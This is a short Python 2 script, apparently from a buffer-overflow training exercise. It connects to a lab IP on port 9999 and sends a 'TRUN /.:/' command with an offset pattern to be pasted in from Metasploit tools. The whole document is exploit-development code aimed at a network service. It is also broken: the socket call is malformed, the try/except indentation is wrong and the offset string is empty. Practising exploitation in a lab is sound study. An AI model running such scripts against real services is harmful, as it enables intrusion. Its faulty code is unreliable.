#!/usr/bin/python

import sys, socket

offset = "" #copy/paste from metasploit framework tools


try:
            s=socket.socket(socket.AF_INET.socket.SOCK_STREAM)
            s.connect(('10.10.234.16',9999)) #change IP
            s.send(('TRUN /.:/' + offset))
            s.close()
            
            
        except:
            print "Error connecting to server"
            
            sys.exit() 
